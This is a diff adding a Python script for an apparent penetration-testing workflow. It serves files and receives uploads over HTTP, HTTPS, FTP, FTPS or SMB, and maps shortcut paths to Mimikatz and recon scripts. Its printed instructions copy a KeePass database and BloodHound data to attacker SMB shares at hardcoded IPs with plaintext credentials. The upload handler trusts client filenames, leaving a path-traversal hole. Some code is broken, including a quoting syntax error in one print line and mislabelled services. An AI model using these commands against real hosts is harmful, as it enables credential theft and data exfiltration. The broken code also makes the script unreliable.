@@ -1,0 +1,327 @@
+#!/usr/bin/python
+
+import base64
+import http.server
+import socketserver
+import os
+import sys
+import subprocess
+import cgi
+import warnings
+import argparse
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
+from pyftpdlib.handlers import TLS_FTPHandler
+from colorama import Fore, Style, init
+import textwrap
+import ssl
+from OpenSSL import SSL
+import psutil
+import socket
+
+# Direct access files  <- ** ADD YOUR OWN SHORTCUTS HERE **
+SHORTCUTS = {
+    # ------------------For windows------------------------------------------
+    '/mm.exe': '~/git/mimikatz64.exe',  # Mimikatz
+    '/mm32.exe': '~/git/mimikatz32.exe',  # Mimikatz32
+    # ------------------Recon scripts----------------------------------------
+    '/recon.sh': '~/bin/recon.sh',  # Linux reconnaissance script
+    '/recon.ps1': '~/bin/recon.ps1',  # Windows reconnaissance script
+}
+
+# Files to replace IP
+IP_REPLACE = [
+    '/recon.sh',
+    '/recon.ps1'
+]
+
+def get_ip(interface):
+    # Obtener todos los interfaces de red
+    interfaces = psutil.net_if_addrs()
+    
+    # Verificar si la interfaz está en la lista
+    if interface in interfaces:
+        # Obtener la dirección IP de la interfaz
+        for snic in interfaces[interface]:
+            # Ignorar las direcciones MAC
+            if snic.family == psutil.AF_LINK:
+                continue
+            # Verificar si es una dirección IPv4
+            elif snic.family == socket.AF_INET:
+                return snic.address
+    return None
+
+# HTTP Handler
+class HTTPHandler(http.server.SimpleHTTPRequestHandler):
+
+    def do_AUTHHEAD(self):
+        self.send_response(401)
+        self.send_header('WWW-Authenticate', 'Basic realm="Login Required"')
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def check_authentication(self):
+        if USERNAME and PASSWORD:
+            auth_header = self.headers.get('Authorization')
+            if auth_header is None:
+                self.do_AUTHHEAD()
+                self.wfile.write(b'Authentication required')
+                return False
+            if auth_header.startswith('Basic '):
+                auth_data = base64.b64decode(auth_header[6:]).decode('utf-8')
+                user, passwd = auth_data.split(':', 1)
+                if user == USERNAME and passwd == PASSWORD:
+                    return True
+            self.do_AUTHHEAD()
+            self.wfile.write(b'Invalid credentials')
+            return False
+        return True
+
+    def do_GET(self):
+        if not self.check_authentication():
+            return
+        super().do_GET()
+
+    def do_POST(self):
+        if not self.check_authentication():
+            return
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        f_name = "uploaded_file"
+        content_disposition = self.headers.get('Content-Disposition', '')
+        if content_disposition:
+            _, params = cgi.parse_header(content_disposition)
+            f_name = params.get('filename')
+        filename = os.path.join(os.getcwd(), f_name)
+        with open(filename, 'wb') as file:
+            file.write(post_data)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Received!!')
+        print(" [*] File received: ", filename)
+
+# Start HTTP server
+def start_http_server():
+    with socketserver.TCPServer(("", PORT), HTTPHandler) as httpd:
+        print(" [>] Listening on port ", PORT)
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\n [>] Closing the HTTP server...")
+            httpd.server_close()
+            sys.exit(0)
+
+
+
+def generate_certificates():
+    """Genera certificados autofirmados si no existen."""
+    if not os.path.exists(CERTFILE) or not os.path.exists(KEYFILE):
+        print(f"Certificados no encontrados. Generando certificados autofirmados...")
+        try:
+            # Ejecuta el comando openssl para generar certificados autofirmados
+            subprocess.run([
+                'openssl', 'req', '-newkey', 'rsa:2048', '-nodes',
+                '-keyout', KEYFILE, '-x509', '-days', '365',
+                '-out', CERTFILE
+            ], check=True)
+            print("Certificados generados con éxito.")
+        except subprocess.CalledProcessError as e:
+            print(f"Error al generar certificados: {e}")
+            sys.exit(1)
+
+
+
+def start_https_server():
+    # Verifica y genera certificados si es necesario
+    generate_certificates()
+
+    # Configura el contexto SSL
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
+
+    handler = HTTPHandler
+    with socketserver.TCPServer(("", PORT), handler) as httpd:
+        # Envuelve el socket en un contexto SSL
+        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+        print(f" [>] Listening on port {PORT} with HTTPS")
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\n [>] Closing the HTTPS server...")
+            httpd.server_close()
+            sys.exit(0)
+
+
+
+
+
+# Start FTP server
+def start_ftp_server():
+    authorizer = DummyAuthorizer()
+
+    mipk = os.getenv('mipk')
+
+    if USERNAME and PASSWORD:
+        authorizer.add_user(USERNAME, PASSWORD, os.getcwd(), perm='elradfmwMT')
+        print(Fore.GREEN + f"\n[>] SMB Server with authentication running" + Style.RESET_ALL)
+        print(f"    User:" +  Fore.YELLOW + f"{USERNAME}"+ Style.RESET_ALL)
+        print(f"    Pass:" + Fore.YELLOW + f"{PASSWORD}\n" + Style.RESET_ALL)
+
+        handler = FTPHandler
+        handler.authorizer = authorizer
+
+        server = FTPServer((mipk, 21), handler)
+        server.serve_forever()
+
+    else:
+        print(Fore.GREEN + f"\n[>] SMB Server without authentication running" + Style.RESET_ALL)
+        handler = FTPHandler
+        handler.authorizer = authorizer
+
+        server = FTPServer(("0.0.0.0", 21), handler)
+        server.serve_forever()
+
+
+
+
+def start_ftps_server():
+
+
+    authorizer = DummyAuthorizer()
+    if USERNAME and PASSWORD:
+        authorizer.add_user(USERNAME, PASSWORD, os.getcwd(), perm='elradfmwMT')
+        print("\n[>] FTPS Server with authentication running")
+    else:
+        raise ValueError("Username and Password must be set for secure FTPS")
+
+    handler = TLS_FTPHandler
+    handler.authorizer = authorizer
+
+    # Configura el contexto SSL para FTPS
+    handler.certfile = CERTFILE  # Ruta a tu certificado SSL
+    handler.keyfile = KEYFILE  # Ruta a tu clave privada
+    handler.tls_control_required = True
+    handler.tls_data_required = True
+
+    server = FTPServer(("0.0.0.0", 21), handler)
+    server.serve_forever()
+
+
+
+
+# Start SMB server
+def start_smb_server():
+    # This requires Impacket installed
+    share_name = "SHARE"
+    folder = os.getcwd()
+
+    smb_cmd = ["impacket-smbserver", "share", "$(pwd)", "-smb2support"]
+
+    mip = os.getenv('mip')
+    mipk = os.getenv('mipk')
+    argv1 = 'my_share'  # Reemplaza con el valor correspondiente de argv[1]
+
+    if mip:
+        print(f"\\\\{mip}\\{argv1}")
+
+    if mipk:
+        print(f"\\\\{mipk}\\{argv1}")
+
+    if USERNAME and PASSWORD:
+        smb_cmd.extend(["-username", USERNAME, "-password", PASSWORD])
+        print(Fore.GREEN + f"\n[>] SMB Server with authentication running" + Style.RESET_ALL)
+        print(f"    User:" +  Fore.YELLOW + f"{USERNAME}"+ Style.RESET_ALL)
+        print(f"    Pass:" + Fore.YELLOW + f"{PASSWORD}\n" + Style.RESET_ALL)
+    else:
+        print(f" [>] SMB server running on port {PORT} without authentication")
+
+    try:
+        subprocess.run(smb_cmd)
+    except KeyboardInterrupt:
+        print("\n [>] Closing the SMB server...")
+        sys.exit(0)
+
+
+
+
+
+
+# Print instructions for file transfer with authentication
+def print_transfer_instructions():
+    if SERVICE == 'ftp':
+        print(f"\n[+] FTP transfer instructions:")
+        print(f"   To download a file: curl ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE} -o {FILE}")
+        print(f"   To upload a file: curl -T {FILE} ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE}")
+    elif SERVICE == 'sftp':
+        print(f"C:\Windows\System32\curl.exe --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+    elif SERVICE == 'smb':
+        print(f"\n[+] SMB transfer instructions:")
+        print(f"copy CEH.kdbx \\10.10.14.3\smbFolder\CEH.kdbx")
+        print(f"copy \\10.10.14.3\smbFolder\CEH.kdbx CEH.kdbx")
+        print(f"net use x: \\192.168.45.161\smbfolder /user:kermit kermit123")
+        print(f"copy .\20240717142918_BloodHound.zip x:\blood.zip")
+        print(f"copy x:\blood.zip .\20240717142918_BloodHound.zip")
+        print(f"New-PSDrive -Name Z -PSProvider FileSystem -Root \\192.168.1.72\share -Credential (New-Object PSCredential ("kermit", (ConvertTo-SecureString "kermit123" -AsPlainText -Force))) -Persist")
+    else:
+        print(f"\n[+] HTTP transfer instructions:")
+        print(f"   To download a file: curl http://{IP}:{PORT}/{FILE} -o {FILE}")
+        print(f"   To upload a file: curl -X POST -F 'file=@{FILE}' http://{IP}:{PORT}/{FILE}")
+
+
+
+
+
+
+# Service selection function
+def run_service():
+    services = {
+        'http': start_http_server,
+        'ftp': start_ftp_server,
+        'smb': start_smb_server,
+        'https': start_https_server,
+        'ftps': start_ftps_server
+    }
+    
+    service_func = services.get(SERVICE)
+    if service_func:
+        service_func()
+    else:
+        print("Unknown service type. Please select either 'http', 'ftp', or 'smb'.")
+
+
+
+# Suppress deprecated cgi warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning, module="cgi")
+os.system("clear")
+
+
+# Argument parser setup
+parser = argparse.ArgumentParser(description="Simple multi-service server with optional authentication")
+parser.add_argument('service', choices=['http', 'ftp', 'smb', 'https', 'ftps'], help="Type of service to run (http, ftp, smb)")
+parser.add_argument('-p', '--port', type=int, default=80, help="Port number to use (default: 80)")
+parser.add_argument('-u', '--user', type=str, help="Username for authentication (optional)")
+parser.add_argument('-f', '--file', type=str, default="<file>", help="Path to a file to be used by the server")
+parser.add_argument('-i', '--interface', type=str, default="tun0", help="Interface IP")
+parser.add_argument('-pw', '--password', type=str, help="Password for authentication (optional)")
+args = parser.parse_args()
+
+
+SERVICE = args.service
+interface = args.interface
+IP = get_ip(interface)
+print("#######")
+print(IP)
+PORT = args.port
+FILE = args.file
+USERNAME = args.user
+PASSWORD = args.password
+CERTFILE = 'server.crt'  # Ruta al certificado
+KEYFILE = 'server.key'   # Ruta a la clave privada
+
+
+if __name__ == "__main__":
+
+    print_transfer_instructions()
+
+    run_service()
